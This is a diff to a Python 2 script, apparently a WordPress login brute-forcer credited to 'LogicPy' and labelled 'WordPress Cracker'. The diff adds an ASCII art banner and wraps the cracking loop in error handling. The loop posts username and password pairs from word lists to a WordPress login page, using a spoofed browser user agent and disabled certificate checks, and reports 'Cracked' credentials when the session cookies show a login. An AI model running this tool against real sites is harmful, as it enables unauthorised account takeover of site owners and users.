@@ -12,7 +12,24 @@ import requests
 from tqdm import tqdm
 
 print """
-
+	                   _.--.    .--._
+	                 ."  ."      ".  ".
+	                ;  ."    /\    ".  ;
+	                ;  '._,-/  \-,_.`  ;
+	                \  ,`  / /\ \  `,  /
+	                 \/    \/  \/    \/
+	                 ,=_    \/\/    _=,
+	                 |  "_   \/   _"  |
+	                 |_   '"-..-"'   _|
+	                 | "-.        .-" |
+	                 |    "\    /"    |
+	                 |      |  |      |
+	         ___     |      |  |      |     ___
+	     _,-",  ",   '_     |  |     _'   ,"  ,"-,_
+	   _(  \  \   \ =--"-.  |  |  .-"--="/   /  /  )_
+	 ,"  \  \  \   \      "-'--'-"      /   /  /  /  ".
+	!     \  \  \   \                  /   /  /  /     !
+	:      \  \  \   \                /   /  /  /      ;
 	 _  _  _ ______       _     _       _       _          
 	(_)(_)(_|_____ \     (_)   | |     (_)     | |     _   
 	 _  _  _ _____) )____ _____| |____  _  ____| |__ _| |_ 
@@ -20,7 +37,7 @@ print """
 	| || || | |          | |  \ \| | | | ( (_| | | | || |_ 
 	 \_____/|_|          |_|   \_)_| |_|_|\___ |_| |_| \__)
 	                                     (_____|           
-	 Coded by LogicPy (WordPress 4.9.6+)
+	Coded by LogicPy - (WordPress Cracker) - [2.0.2 - 4.9.8]
 
 """
 
@@ -117,31 +134,37 @@ def bruteforce():
 				pwd = p
 				progressBar.update(1)
 
-				# 1) Direct to login url. Prepare for POST login
-				c.get(login_URL)
+				try:
 
-				#POST Login data
-				login_data = \
-				{
-					'log': uname,
-					'pwd': pwd,
-					'wp-submit': 'Log In',
-					'testcookie': '1'
-				}
+					# 1) Direct to login url. Prepare for POST login
+					c.get(login_URL)
 
-				#Header data
-				header_data = {
-					'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0'
-				}
+					#POST Login data
+					login_data = \
+					{
+						'log': uname,
+						'pwd': pwd,
+						'wp-submit': 'Log In',
+						'testcookie': '1'
+					}
 
-				# 2) Submit POST data. Initialize login
-				r = c.post(login_URL, data=login_data, headers=header_data, verify=False)
+					#Header data
+					header_data = {
+						'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0'
+					}
 
-				cookie = str(r.cookies)
-				if cookie.find('settings')>-1 or cookie.find('=' + uname)>-1:
-					progressBar.close()
-					print "\n Cracked [ %s : %s ] \n" % (u,p)
-					break
+					# 2) Submit POST data. Initialize login
+					r = c.post(login_URL, data=login_data, headers=header_data, verify=False)
+
+					cookie = str(r.cookies)
+					if cookie.find('settings')>-1 or cookie.find('=' + uname)>-1:
+						progressBar.close()
+						print "\n Cracked [ %s : %s ] \n" % (u,p)
+						break
+
+				except:
+
+					print "\n Connection Error \n"
 
 		text_file.close()
 		text_file2.close()
